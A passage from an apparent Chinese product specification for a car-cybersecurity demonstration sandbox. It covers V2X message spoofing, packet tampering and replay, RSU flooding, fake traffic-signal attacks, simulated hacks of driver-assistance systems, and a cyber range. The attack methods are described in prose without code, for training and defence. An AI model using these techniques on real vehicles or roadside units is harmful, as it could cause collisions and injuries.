title="功能实施方案"></a>功能实施方案</h4><ol><li>支持伪冒车辆权限攻击场景，具体表现为演示模块可以伪造车辆标识信息，以欺骗其他车辆或基础设施认为其具有合法的车辆权限。攻击者可以通过控制演示模块的发送行为，向其他车辆或基础设施发送虚假的消息，从而扰乱整个V2X网络的正常运行。为了更好地模拟真实的攻击场景，支持多种不同的伪冒车辆标识信息设置。用户可以根据自己的需求选择不同的伪冒车辆标识信息，以便更好地模拟不同的攻击场景。同时，演示模块还提供了丰富的攻击模式和参数设置，使用户能够更加细致地控制攻击行为，以达到最佳的攻击效果。</li><li>数据捕获配置工具是V2X攻防演示模块的核心组成部分之一，它负责完成对OBU（攻击）捕获到的LTE-V2X消息发送的目的IP及端口进行配置的任务。用户可以通过该工具，灵活地配置目的IP及端口，以满足不同的安全测试需求。同时，数据捕获配置工具还支持对捕获到的数据进行过滤和分类，使用户能够更加方便地进行数据分析和处理。为了保证配置信息的安全性和稳定性，该工具将配置信息持久化保存在OBU中。这样，即使设备断电或重新启动，用户也无需重新进行配置，可以直接使用之前的配置信息。同时，持久化保存还可以避免配置信息被非法访问或篡改的风险，从而提高系统的安全性和可靠性。默认开启捕获功能，这意味着当OBU（攻击）捕获到LTE-V2X消息时，数据将自动被保存和发送到预先配置的目的IP及端口。用户无需手动启动或停止捕获功能，可以直接使用该模块进行安全测试和评估。</li><li>支持当OBU（攻击）捕获到LTE-V2X网络消息后，根据数据捕获工具的配置信息，将捕获到的数据发送给PC。数据传输通常使用网络连接，可以通过以太网或无线局域网等方式进行。PC上使用Wireshark作为抓包工具，通过网卡进行数据抓取和分析。Wireshark是一款功能强大的网络协议分析工具，可以实时捕获和解析网络数据包。它支持多种协议和数据格式，包括LTE-V2X网络消息。通过Wireshark的可视化展示，用户可以清晰地查看LTE-V2X消息的各个字段和内容，便于进行进一步的数据分析和解读。同时，在Wireshark展示LTE-V2X消息的过程中，用户可以选择将抓取到的数据保存为pcap文件。pcap文件是一种常用的网络数据包存储格式，可以方便地进行离线分析和共享。通过保存为pcap文件，用户可以随时回放和重现LTE-V2X消息的传输过程，更加方便地进行安全评估和漏洞分析。</li><li>攻击辅助工具提供了对pcap文件中的数据包进行篡改的功能。具体来说，该工具可以定位到pcap文件中的每个数据包，并将其中的紧急车辆字段进行修改，将其改为预先指定的紧急车辆标识数值。这样可以模拟攻击者对LTE-V2X消息进行恶意篡改的行为。篡改后的数据包通过WiFi网络发送给OBU（攻击）。WiFi网络作为一种无线局域网技术，可以提供远程无线连接的能力。通过WiFi网络，攻击辅助工具可以与OBU（攻击）建立通信，将篡改后的数据包传送给OBU（攻击），使其能够接收到并进一步操作。OBU（攻击）收到篡改后的LTE-V2X消息后，会将这些消息进行广播，发送到PC5网络中。PC5网络是一种车辆之间直接通信的技术，可以实现车辆之间的高效、低时延的通信。通过广播篡改后的LTE-V2X消息到PC5网络中，可以模拟恶意攻击者对整个车辆通信网络造成干扰和破坏的情景。</li><li>支持虚构车辆攻击场景功能，它可以帮助用户模拟各种恶意攻击场景，以评估车辆通信系统的安全性和鲁棒性。具体来说，可以通过攻击辅助工具，伪造虚假的车辆信息，并将其注入到车辆通信网络中。例如，攻击者可以伪造虚假的车辆位置信息、速度信息、方向信息等，向车辆通信网络中发送恶意信息，从而引起车辆之间的混乱和干扰。</li><li>v2x攻防演示模块具备一个工具开启OBU（攻击）的位置模拟开关，当打开开关，OBU（攻击）即被激活后，它可以将之前记录的车辆历史轨迹信息添加到LTE-V2X消息中，并将这些消息发送出去。接收到这些消息的其他车辆OBU，即使实际上并没有真正的车辆存在，也会显示出周围存在其他车辆的信息。这种攻击可以导致其他车辆的驾驶人产生误解，以为周围有车辆存在，从而可能影响他们的驾驶决策和行为。</li><li>支持伪造虚假的道路流动车辆数据，并将其注入到车辆通信网络中，攻击者可以伪造虚假的车辆位置、速度、加速度等参数，向车辆通信网络中发送恶意信息，从而引起车辆之间的混乱和干扰。</li><li>支持发布虚拟的BSM消息伪造道路上的流动车辆，在攻击者的OBU上伪造虚拟的BSM消息，模拟道路上的流动车辆。攻击者可以使用虚拟BSM消息来欺骗RSU和其他车辆，导致RSU上传错误的车辆信息和数据。</li><li>支持通过配置OBU来模拟大量的BSM消息，并以高频次的方式发送给RSU。攻击者可以利用此功能来制造大量虚假的车辆通信流量，超过RSU处理能力，从而导致RSU的拥塞，使其无法正常处理和传输车辆信息。</li><li>支持通过配置OBU来伪造虚假的车辆信息，如位置、速度等，并以高频率发送这些虚假信息，从而扰乱车车通信，欺骗其他车辆和RSU。当演示小车收到虚假信息后，可能会导致其做出错误的决策，如误判车辆位置、速度等，从而引发交通事故或者碰撞。</li><li>支持通过篡改或伪造RSU发送的交通信号灯信息，使其发布错误的信号灯状态，如将绿灯变为红灯或黄灯，或者将红灯变为绿灯等。当演示小车接收到错误的信号灯信息后，可能会误判交通状况，导致闯红灯行为的发生。</li><li>支持智能驾驶网络安全沙盘紧密集成，通过双向数据传输和信息共享，实现了演示效果的联动。当模拟攻击场景时，会向智能驾驶网络安全沙盘发送相关的攻击信号和指令。智能驾驶网络安全沙盘会根据接收到的攻击信号和指令，调整模拟车辆的行为和反应，并将其实时反馈给V2X攻防演示模块。</li></ol><h4 id="技术实现内容-2"><a href="#技术实现内容-2" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>该演示旨在展示车辆到车辆通信（V2V）和车辆到基础设施通信（V2I）中存在的安全漏洞，并演示如何进行攻击和防御。通过模拟实际的V2X场景，演示参与者将了解V2X系统的安全挑战，并学习如何保护这些系统免受潜在的攻击。</p><p>演示步骤：</p><p>演示环境搭建：使用一个基于沙盘的模拟环境来模拟V2X通信场景。该环境包括模拟车辆和基础设施，以及相关的通信设备和网络。</p><p>攻击示范：演示者将展示一系攻击场景，例如恶意车辆伪造、信息篡改、拒绝服务攻击等。演示者将详细说明攻击的原理和方法，并演示攻击如何影响V2X通信的安全性和可靠性。</p><p>防御示范：演示者将介绍一些常见的防御措施和安全策略，以保护V2X系统免受攻击。包括加密通信、身份验证、数据完整性检查等技术和方法。</p><p>演示互动：演示参与者将有机会参与演示，以加深对V2X攻防的理解。他们可以提出问题、提供解决方案，并参与模拟的攻击和防御过程</p><p>V2X攻防演示模块设计和实施遵循严格的安全标准和协议。这些安全措施包括身份验证、数据完整性验证、加密协议、短期证书和密钥管理等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/85f969ec0670b6edeb438686d8b4331f.png"></p><p>V2X攻防演示模块首先，要配置OBU（攻击）上的数据捕获工具，以便捕获LTE-V2X网络消息并将其发送给与OBU连接的PC。这包括设置捕获的过滤条件和目标IP地址等。其次，确保PC和OBU之间建立了可靠的连接，以便将捕获到的LTE-V2X网络消息传输到PC上。PC上安装并打开Wireshark工具通过正确的网络接口（网卡）来捕获从OBU传输到PC的数据流量。在Wireshark中，设置适当的过滤条件，以仅显示LTE-V2X相关的数据包。在Wireshark上启动抓包，开始捕获从OBU传输到PC的LTE-V2X数据包，能够在Wireshark中实时查看和分析这些数据包。Wireshark可以提供多种展示选项，根据需要选择合适的方式进行数据展示。同时，可以将捕获到的数据保存为pcap文件。</p><p>V2X攻防演示模块攻击者获取到pcap文件，该文件记录了车辆之间的通信数据包。攻击者将每个数据包中的紧急车辆字段进行篡改，改变其数值为紧急车辆标书数值。攻击者通过WiFi网络将篡改后的数据包发送给目标OBU。攻击者在物理上接入到车辆的WiFi网络，并能够成功发送数据包。OBU接收到篡改后的数据包，并解析其中的LTE-V2X消息。由于消息中紧急车辆字段被篡改，OBU可能会误认为有紧急情况发生。OBU将篡改后的LTE-V2X消息广播到PC5网络中。</p><p>V2X攻防演示模块具有伪冒车辆权限攻击场景。</p><p>V2X攻防演示模块模拟伪冒车辆权限攻击（Vehicle Privilege Escalation Attack）场景，以便于研究和演示攻击过程及其对车辆系统的影响，并开发相应的防御措施。该系统将重点模拟攻击者如何通过漏洞或设计缺陷获取并提升车辆系统权限，进而控制车辆的关键功能。</p><p>V2X攻防演示模块具有虚构车辆攻击场景功能。</p><p>V2X攻防演示模块只有授权的人员才能访问配置工具并进行相关设置。在配置工具的用户界面上，有一个明确的开关或选项，用于打开或关闭OBU（攻击）的位置模拟功能。为了防止未经授权的人员利用OBU（攻击）进行恶意活动，配置工具采取必要的安全性和防护措施。在开启OBU（攻击）的位置模拟功能之前，进行充分的风险评估和测试。在开启OBU（攻击）的位置模拟功能之前，确保配置工具符合相关的法律和合规要求。</p><p>V2X攻防演示模块具有假冒道路流动车辆数据攻击场景功能。</p><p>V2X攻防演示模块攻击者伪造BSM消息时，发送虚假的车辆信息和数据给RSU。导致RSU错误地认为有更多或更少的车辆在道路上行驶，进而影响交通信号灯的控制、交通拥堵的评估以及交通事故的预警等功能。</p><p>V2X攻防演示模块拥塞式攻击旨在通过超过RSU处理能力的消息负载来消耗其资源，使其无法正常工作。攻击者使用特殊软件或脚本来伪造大量的BSM消息，并以非常高的频率将它们发送到RSU。由于RSU需要处理和解析每个收到的消息，当消息数量超过其可承受范围时，RSU可能会出现延迟、错误、丢失消息或系统崩溃等问题。</p><p>V2X攻防演示模块具备通过OBU（攻击）扰乱车车通信，从而导致演示小车碰撞的功能。</p><p>V2X攻防演示模块具备攻击RSU，从而使RSU发布错误交通信号灯信息，进而导致演示小车闯红灯的功能。</p><p>V2X攻防演示模块具备与网络安全沙盘之间的演示效果联动功能。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/57f487bc853705034802c4744bb9d7e6.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/57f487bc853705034802c4744bb9d7e6.png"></p><h3 id="自动驾驶演示模块"><a href="#自动驾驶演示模块" class="headerlink" title="自动驾驶演示模块"></a>自动驾驶演示模块</h3><h4 id="功能实施方案-3"><a href="#功能实施方案-3" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>支持SUA场景的攻防：意外加速<ol><li>支持用户在演示中设定车辆的目标速度，并使车辆能够根据前方车辆的行驶情况自动进行加速和减速控制。通过模块的设置界面，用户可以轻松调整ACC的参数，例如设定车辆的巡航速度和安全距离等。</li><li>支持用户可以通过模块的控制台或者远程指令，将模拟车辆的速度快速增加到设定速度以上。这种突然的加速会在演示中引发一系列反应和后续事件。</li><li>支持模拟车辆突然加速到设定速度以上时，受到黑客攻击后自适应巡航控制系统（ACC）无法解除的场景。在这种情况下，会持续发送指令给车辆，使其保持加速状态，而无法及时进行减速或停车。在与前车的距离逐渐缩小的过程中，模拟车辆最终会发生追尾事故。</li></ol></li><li>支持LKA场景的攻防：车道保持辅助功能故障<ol><li>支持用户在演示中设定车辆的目标位置和行驶方向，并使车辆能够自动沿着车道行驶。通过设置界面，用户可以调整车辆的行驶速度、车道偏离警告等参数，以实现不同情况下的模拟操作。</li><li>支持用户可以通过控制台或者远程指令，受到黑客攻击后使车辆的车道保持辅助装置失效，从而导致车辆逐渐偏离主车道，进入侧车道。在演示过程中，会模拟车道偏离警告系统的反应，以及车辆在侧车道上的行驶情况。</li><li>支持模拟车辆可能由于前方车速变化、距离判断错误等原因，导致无法及时进行刹车或避让，最终与左侧车道的车辆发生碰撞。</li></ol></li><li>支持AEB场景的攻防：自主紧急制动失效<ol><li>支持用户可以设定车辆的目标位置和行驶方向，并利用ACC（Adaptive Cruise Control）的功能进行高速公路自动驾驶。通过调整界面参数，用户可以设置车辆的行驶速度、跟车距离等参数，以实现不同情况下的模拟操作。</li><li>支持用户可以通过模块的控制台或者远程指令，受到黑客攻击后使车辆的自主紧急制动失效，从而导致车辆在高速公路上突然制动。在演示过程中，会模拟制动异常信号的反应，以及车辆在制动时的行驶情况。</li><li>支持模拟车辆在制动异常情况下被后车追尾的场景。在这种情况下，模拟车辆可能由于制动失效、距离判断错误等原因，导致无法及时避让后车，最终与后车发生碰撞。</li></ol></li><li>支持TSR场景的攻防：交通标志识别故障<ol><li>支持用户可以选择利用ACC（Adaptive Cruise Control）功能进行高速公路自动驾驶。通过设定目标位置和行驶方向，并调整相应参数，模块可以实现车辆在高速公路上的自动驾驶，以模拟真实的行驶情况。</li><li>支持用户可以通过模块的控制台或者远程指令，受到黑客攻击后使车辆的交通标志识别系统出现故障，导致无法正确识别并显示限速标志。这样，模拟车辆就可能在没有接收到限速信息的情况下进行行驶，从而可能导致超速行驶的问题。</li><li>支持模拟在交通标志识别故障的情况下，未确保ACC安全制动距离而与前车相撞的场景。在这种情况下，模拟车辆可能由于无法正确识别限速标志，导致未能按照实际限速要求调整车辆速度，进而未能保持安全的距离，并最终与前车发生碰撞。</li></ol></li><li>支持EO场景的攻防；发动机意外熄火<ol><li>支持用户可以选择驾驶员在市内道路上进行行驶的场景。通过设定驾驶员的目标位置和行驶方向，并调整相应参数，可以模拟真实的市内道路行驶情况。</li><li>支持模拟发动机意外熄火的情况，当驾驶员驶近交叉口时，受到黑客攻击后发动机突然熄火的情况，导致车辆失去动力。这样，模拟车辆就会停在交叉口附近，无法继续前进。</li><li>在发动机意外熄火后，支持模拟车辆可能无法重新启动，导致无法移动。导致后面的车辆没有及时察觉并采取避让措施，发生追尾事故。</li></ol></li><li>支持EOC场景的攻防：油门故障<ol><li>支持用户可以选择驾驶员在高速公路上进行行驶的场景。通过设定驾驶员的目标位置和行驶方向，并调整相应参数，可以模拟真实的高速公路行驶情况。</li><li>当驾驶员在高速公路上进入直行加速区域时，受到黑客攻击后油门突然故障的情况，导致车辆无法继续加速反而减速。这样，模拟车辆就会在直行加速区域内失去速度，无法保持正常的行车速度。</li><li>在油门故障导致车辆减速后，导致后方的车辆没有及时察觉并采取避让措施，发生追尾事故。支持模拟这种情况，以展示油门故障对行车安全的影响。</li></ol></li><li>支持EB场景的攻防：制动失效<ol><li>用户可以选择驾驶员在国道上进行行驶的场景。通过设定驾驶员的目标位置和行驶方向，并调整相应参数，可以模拟真实的国道行驶情况。</li><li>提供了紧急弯道区域的功能。当驾驶员驶入紧急弯道区域时，模块受到黑客攻击后将引发制动失效的故障，使得车辆无法正常进行制动操作。</li><li>在制动失效的情况下，车辆无法减速并控制速度，导致车辆偏离原本的车道。支持模拟这种情况，以展示制动失效对行车安全的影响</li></ol></li><li>支持IHBC场景的攻防：智能远光灯控制故障<ol><li>用户可以选择驾驶员在国道上进行行驶的场景。通过设定驾驶员的目标位置和行驶方向，并调整相应参数，可以模拟真实的国道行驶情况。</li><li>提供急转弯车道区域的功能，当驾驶员驶入急转弯车道区域时，受到黑客攻击后引发智能远光灯控制故障，使得车辆无法正确辨别车道。</li><li>在智能远光灯控制故障的情况下，车辆无法准确识别车道并调整灯光亮度。导致车辆在急转弯车道区域内无法正确保持车道，从而偏离原本的行驶轨迹。支持模拟这种情况，以展示智能远光灯控制故障对行车安全的影响。</li></ol></li></ol><h4 id="技术实现内容-3"><a href="#技术实现内容-3" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>为验证自动驾驶的安全性与可靠性，本方案搭建一套基于沙盘的自动驾驶演示场景，演示步骤为：</p><p>1. 环境搭建：准备一个沙盘模型，代表一个道路网络和周围环境。使用合适的比例和细节来模拟真实的道路情况，包括车道、交叉口、路标、交通信号灯等。</p><p>2. 车辆模拟：选择一个或多个自动驾驶车辆模型，并放置在沙盘上。确保车辆模型与实际车辆的尺寸和特征相匹配。</p><p>3. 传感器模拟：为车辆模型添加传感器模拟器，模拟自动驾驶车辆常用的传感器，如摄像头、激光雷达、雷达等。这些传感器将用于感知周围环境并获取数据。</p><p>4. 自动驾驶算法：为车辆模型加载自动驾驶算法，模拟车辆的决策和控制过程。这些算法可以是预先定义的规则或基于机器学习的模型。</p><p>5. 演示场景设计：设计一个或多个自动驾驶场景，例如道路变道、交叉口通行、避障等。确保场景具有挑战性，并涵盖不同的交通情况和道路条件。</p><p>6. 演示执行：在沙盘上执行自动驾驶演示，模拟车辆的行为和决策过程。观察车辆如何感知环境、做出决策并执行动作。</p><p>7. 故障模拟：模拟自动驾驶系统的故障情况，例如传感器故障、算法错误等。观察系统如何处理故障情况，并评估其容错性和安全性。</p><p>演示模块将通过高保真仿真环境，实时展示自动驾驶系统在各种故障和攻击场景下的行为及其安全防御措施的效果。</p><p>本方案旨在设计和实现一个自动驾驶演示模块，该模块能够模拟并展示包括SUA、LKA、AEB、TSR、EO、EOC、EB和IHBC在内的八种自动驾驶场景的攻防。模块将用于教育、演示和测试自动驾驶系统的安全性。实现方案如下：</p><ol><li>支持SUA场景的攻防：意外加速</li></ol><p>a) 自适应巡航ACC利用国道自动驾驶；</p><p>b) 车辆突然加速到设定速度以上；</p><p>c) ACC不可以解除，与前车追尾。</p><p>实现方案：在仿真环境中编程模拟ACC系统的软件缺陷，使其在特定条件下触发意外加速，并锁定ACC，阻止驾驶员解除控制，直至发生追尾，以此来演示系统的攻击响应和紧急手动干预程序。</p><ol><li>支持LKA场景的攻防：车道保持辅助功能故障</li></ol><p>a) 使用车道保持辅助装置自动驾驶；</p><p>b) 车道保持辅助装置故障，导致车辆驶入侧车道；</p><p>c) 与左侧车道车辆发生追尾。</p><p>实现方案：通过模拟车道保持系统接收错误的车道标记信息或系统故障，使得车辆错误地判断车道位置并驶向侧车道，进而演示故障发生时的车辆行为和紧急措施。</p><ol><li>支持AEB场景的攻防：自主紧急制动失效</li></ol><p>a) 利用ACC的高速公路自动驾驶；</p><p>b) 制动出现异常信号，车辆突然制动；</p><p>c) 被后车追尾。</p><p>实现方案：在模拟系统中引入虚假的障碍物或故障信号，导致AEB系统异常激活，引发突然制动，以此来测试后续车辆的反应能力和系统的故障处理机制。</p><ol><li>支持TSR场景的攻防：交通标志识别故障</li></ol><p>a) 利用ACC的高速公路自动驾驶；</p><p>b) 交通标志（限速标志）识别故障，导致超速行驶；</p><p>c) 未确保ACC安全制动距离，与前车相撞。</p><p>实现方案：模拟交通标志识别系统无法正确读取或解释限速标志，导致ACC未能调整车速，从而模拟超速行驶至追尾的场景，同时评估紧急情况下的人工干预效果。</p><ol><li>支持EO场景的攻防；发动机意外熄火</li></ol><p>a) 驾驶员在市内道路上行驶；</p><p>b) 当进入交叉口是，发动机意外熄火；</p><p>c) 无法重新启动，导致追尾事故。</p><p>实现方案：通过模拟发动机控制单元的故障信号，引起发动机突然熄火，特别是在交叉口等关键地点，来测试车辆的应急反应和驾驶员的干预能力。</p><ol><li>支持EOC场景的攻防：油门故障</li></ol><p>a) 驾驶员在高速公路上行驶；</p><p>b) 在直行加速区域行驶中，由于油门故障无法加速反而减速；</p><p>c) 导致与后方车辆发生追尾事故。</p><p>实现方案：设置模拟油门传感器故障，使得油门响应不当，无法正常加速甚至减速，从而展示在高速行驶中油门故障对车辆控制的影响及后果。</p><ol><li>支持EB场景的攻防：制动失效</li></ol><p>a) 驾驶员在国道上行驶；</p><p>b) 进入紧急弯道区域；</p><p>c) 因制动故障，无法控制车速，导致车道偏离。</p><p>实现方案：通过编程模拟制动系统的失效，特别是在紧急弯道区域，来观察和演示无法控制车速时的车辆行为和紧急逃逸策略。</p><ol><li>支持IHBC场景的攻防：智能远光灯控制故障</li></ol><p>a) 驾驶员在国道上行驶；</p><p>b) 进入急转弯车道区域；</p><p>c) 自动变换近光灯和远光灯，无法辨别车道，导致偏离车道。</p><p>实现方案：仿真智能远光灯控制系统的故障，导致在急转弯区域无法正确切换灯光模式，从而模拟因视线不清导致的车道偏离事件，并评估驾驶员的应对措施。</p><h3 id="异地互联演示模块"><a href="#异地互联演示模块" class="headerlink" title="异地互联演示模块"></a>异地互联演示模块</h3><h4 id="功能实施方案-4"><a href="#功能实施方案-4" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>功能参数如下：</p><ol><li><p>支持对汽车信息安全攻防渗透平台的屏幕，可以根据实际使用需求，将屏幕迁移到任意平台网络通达的位置，并进行安装。迁移安装完成后即可正常观看到汽车信息安全攻防渗透平台。</p></li><li><p>用户可以选择远程循环播放靶场演练实时宏观、微观态势可视化的场景。模块支持多种数据源和格式，例如视频流、图像、数据包等，在攻防靶场进行实时演练时，用户选择最适合自己需求的数据来源，进行可视化展示整体攻击和防御的情况、进度等宏观态势，也可以可视化展示对某个具体的靶标实施攻击情况，攻击步骤等微观态势。</p></li><li><p>具备强大的计算和存储能力，支持大规模车联网攻防演练的播放。该模块可以模拟多达200个车端节点的攻防场景，以便用户进行真实且复杂的演练。在演示过程中，会自动生成和控制多个车端节点，模拟车联网环境。这些节点可以扮演不同的角色，包括受攻击目标、攻击者、防御者等，以模拟各种攻防场景。用户可以通过预设参数或手动设置，调整节点的行为和状态，以满足不同的攻防需求。</p></li><li><p>该模块具的备互联演示工作站集成了各种必要的工具、软件和服务，方便用户在一个统一的环境中进行演示工作，需在多个软件之间切换，可以在同一个界面下完成全部操作。</p></li><li><p>异地互联演示工作站信息如下：</p><p>品牌：联想</p><p>型号：Thinkstation P3</p><p>数量：1套</p><p>指标参数信息如下：</p></li></ol><p>工作站配置至强® W-2223处理器，内存16G DDR4，显卡RTX4070 TI 12G显存，存储1T+500G SSD硬盘，前后共4个USB接口，1个HDMI接口，1个DVI接口。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/dfef6fa34e69576fe21d97de19c9f5ab.png"></p><h4 id="技术实现内容-4"><a href="#技术实现内容-4" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>本方案搭建一套基于智能汽车网络靶场的异地互联演示，该演示场景主要通过搭建本地工作站，然后通过工作站来对靶场进行访问展示。</p><p>异地互联演示模块将一个屏幕的内容实时传输到另一个屏幕上。该模块还支持在不同地理位置的信息安全攻防渗透平台上进行安装，注重信息安全，提供了加密和认证等措施。</p><p>异地互联演示模块允许用户远程控制靶场演练的循环播放功能，提供了宏观态势的可视化功能，还支持对微观态势的可视化。</p><p>异地互联演示模块具备播放车联网攻防演练的功能，能够支持200个车端节点的同时播放，并且在进行大规模车联网攻防演练时，充分考虑信息安全问题。</p><p>异地互联演示模块实现多个设备之间的互联演示，工作站支持屏幕共享功能，可以将一个设备的屏幕内容实时传输到其他连接的设备上。工作站具备多设备控制能力，可以通过一个主控设备操控其他连接的设备。工作站支持多种类型的媒体文件播放，工作站提供互动功能，可以让与会者进行实时问答和讨论。工作站具备安全性保障功能，能够对设备间的连接和数据传输进行加密和防护。</p><h3 id="整车厂网络攻防演练演示模块"><a href="#整车厂网络攻防演练演示模块" class="headerlink" title="整车厂网络攻防演练演示模块"></a>整车厂网络攻防演练演示模块</h3><h4 id="功能实施方案-5"><a href="#功能实施方案-5" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>该模块支持自定义网络系统的拓扑结构，划分不同的区域，可以生成办公区、开发测试区、安全运营中心、内网服务器集群、业务服务器集群等区域的拓扑，若拓扑发生变化，可对拓扑进行编辑。整个网络拓扑均可以在该模块上进心可视化显示，也能投送到大屏上进行显示。</li><li>支持用户构建复杂的大规模目标网络，可以根据实际需求，在该模块中添加大量的设备、服务器、交换机等网络组件，并连接它们以构建庞大而真实的网络环境。提供数据管理功能，可以对模块中的数据进行有效管理，包括模拟攻击产生的日志信息、攻击流量数据以及网络设备的配置信息等，管理员可以方便地查询、导出和分析这些数据，进行后续的安全评估和改进。具备试验实时指挥的能力，用户可以通过该模块对整个网络攻防演练过程进行实时指挥和控制，通过演练模块进行攻击场景的设定、攻击的触发和停止，以及演练的时间调度等操作。同时，该模块能够对整车厂网络系统中的用户行为进行监控和分析，通过对用户的操作行为、访问请求等进行监测和记录，能够及时发现异常行为和潜在威胁，并采取相应的安全措施。具备态势展示功能，可以通过该模块直观地查看攻防演练模块的安全态势，包括实时的攻击情况、网络流量、设备状态等信息的展示，可以及时了解网络安全状况并做出相应的决策。支持与其他联邦靶场进行互联互通功能，用户可以通过该模块与其他靶场组织进行连接，实现跨组织的网络攻防合作与演练。</li><li>支持对整车厂网络攻防演练所需的基础设施进行管理，包括服务器、交换机、防火墙等网络设备的配置和监控。用户可以通过模块进行设备的添加、删除、配置和状态监测，确保演练环境的正常运行。提供目标网络管理功能，用户可以自定义构建目标网络的拓扑结构，并设置每个网络节点的属性和漏洞情况。用户可以灵活地调整目标网络的规模和复杂度，以满足不同演练需求。支持对生成的大量数据进行统一管理和存储。用户可以将模拟攻击产生的日志信息、攻击流量数据和网络设备的配置信息等数据集中存储，并提供检索、备份和恢复等功能，以便进行后续的安全评估和数据分析。具备试验支撑功能，为用户提供丰富的攻击手段和工具，如漏洞扫描器、密码破解工具、入侵检测系统等，以支持用户进行各种类型的网络攻击和防御演练。支持用户对整车厂网络攻防演练的试验配置进行管理。用户可以根据需要设置攻击场景的参数、演练时间、攻击强度等，灵活地调整演练的条件和规模，以实现不同场景下的安全评估与验证。具备分布式适配能力，可以在多个节点上部署和运行，实现分布式的网络攻防演练。这样可以提高系统的并发处理能力和扩展性，满足大规模演练的需求。支持对整车厂网络系统中的数据进行采集和监测。用户可以获取网络流量、设备状态、用户行为等数据，并进行实时分析和记录，以便及时发现异常情况和潜在威胁。提供态势分析功能，通过对采集到的数据进行分析和挖掘，帮助用户了解网络安全状况和攻击趋势。用户可以通过可视化界面查看网络攻击事件、威胁情报和安全事件的关联，以便及时做出相应的应对和决策。</li><li>支持提供虚拟化技术支持，可以创建和管理虚拟机、容器等计算资源，以搭建演练所需的虚拟网络环境。用户可以按需分配计算资源，灵活配置虚拟机规格和数量，以满足不同演练场景的要求。支持对整车厂网络设备进行运维管理，包括服务器、交换机、防火墙等网络设备。用户可以通过模块进行设备的远程管理、配置和监控，以确保设备的正常运行和安全性。支持整车厂网络设备的实物仿真资源，包括真实的网络设备、物理线缆等。用户可以通过与虚拟计算资源相结合，搭建真实的网络拓扑结构，并进行攻击和防御演练。这样可以更加真实地模拟实际网络环境中的攻击与防御情况。支持其他专用硬件资源的集成和管理，如入侵检测系统、流量监测设备等。用户可以将这些硬件资源与虚拟计算资源相结合，构建更加全面的网络攻防演练环境，以提高演练的真实性和可靠性。</li><li>支持利用虚拟化技术，如KVM（Kernel-based Virtual Machine）和Docker等，创建和管理虚拟节点。KVM虚拟节点可以模拟出真实的操作系统环境，而Docker容器节点则提供了更轻量级的虚拟化方案。用户可以根据需要选择合适的虚拟化技术，以生成目标网络中的虚拟节点。通过SDN（Software-Defined Networking）和网络虚拟化技术，将虚拟化节点构建成虚拟仿真网络。SDN可以帮助用户灵活地配置和管理虚拟网络中的各种网络设备和服务。通过网络虚拟化技术，用户可以自定义构建出逼真的静态目标网络拓扑结构。采用虚拟互联技术，将实体设备透明地接入到虚拟网络中。通过虚拟互联技术，用户可以将实际的网络设备（如服务器、交换机等）连接到虚拟网络中，实现虚拟网络与实体设备之间的通信和互联。提供接入及管理组件，用于实现对整个目标网络的管理。该组件可以监控虚拟节点的状态、配置网络参数、设置安全策略等。用户可以通过接入及管理组件对目标网络进行实时管理和调整，以满足不同演练场景的需求。</li><li>支持主动或被动地采集与网络攻防演练相关的各类数据，包括网络流量数据、系统日志、事件记录等。这些数据可以通过监测设备、嗅探器、代理等方式进行采集，并传输到演示模块进行处理和存储。内置靶场资源库，其中包含了各种靶标、漏洞、知识图谱等相关信息。靶标指的是模拟的目标系统或网络设备，漏洞则是模拟的系统或设备中存在的安全漏洞，知识图谱则提供了关于网络攻防的相关知识和技术资料。这些资源可以供用户在演练过程中使用和参考。支持将采集到的数据以及靶场资源库中的内容进行统一的存储管理。使用数据库或分布式存储系统，可以有效地存储和管理大量的数据和资源信息。用户可以通过演示模块提供的接口，对存储的数据进行查询、检索和管理。支持数据分析与挖掘，通过应用数据挖掘算法和技术，对采集到的数据进行处理、分析和挖掘，提取出有价值的信息和规律。这些信息可以为网络攻防演练提供参考和指导，帮助用户更好地了解网络环境和攻防态势。</li><li>支持监控整个系统资源的使用情况，包括CPU利用率、内存占用、磁盘空间、网络带宽等。通过实时监控和记录这些指标，用户可以了解系统的运行状态和资源使用情况，及时发现问题并采取相应的优化措施。提供系统资源管理功能，用户可以通过该功能对系统资源进行管理和调整。例如，可以设置CPU优先级、内存分配、磁盘配额等，以满足不同应用场景的需求。同时，还可以进行系统资源的分配和释放，确保资源的合理利用和高效管理。支持对仿真的目标网络进行拓扑配置，包括主机设备、网络设备和链路等的配置描述。用户可以根据需要创建虚拟主机、虚拟交换机、虚拟路由器等，建立起复杂的网络拓扑结构。通过拓扑配置，可以灵活地模拟真实网络环境，为网络攻防演练提供更真实的场景。提供设备管理功能，用户可以对主机设备、网络设备等进行集中管理。通过设备管理界面，用户可以查看设备的状态、配置参数、日志信息等，并进行相应的管理操作，如启动、停止、重启等。这样可以方便用户对目标网络中的各个设备进行监控和管理。</li><li>支持对靶场人员的管理，管理员可以创建和管理靶场参与人员的账号和权限，包括添加、删除、修改账号信息，以及指定各个人员的角色和权限。通过人员管理功能，可以确保只有授权人员能够参与演练，并且分配合适的权限。支持对靶场中的靶标进行管理。靶标可以是虚拟机器、应用程序、操作系统或其他网络服务。管理员可以在演示模块中添加、删除、配置和监控靶标，以模拟真实的攻击目标。靶标管理功能还可以对靶标的状态进行监控，包括运行状态、漏洞情况等，以便及时发现和解决问题。支持对靶场的访问控制。管理员可以设置不同人员对靶场资源的访问权限，包括读取、写入、执行等。通过访问控制功能，可以确保只有经过授权的人员才能够访问和操作靶场资源，提高演练的安全性和可控性。提供对靶场状态的实时监控功能。管理员可以通过演示模块查看靶场各个组件的运行状态、网络流量、系统负载等信息。通过实时监控，可以及时了解靶场的运行情况，发现异常并采取相应的措施。支持对靶场资源的分配和管理。管理员可以根据需要分配不同的资源给不同的参与人员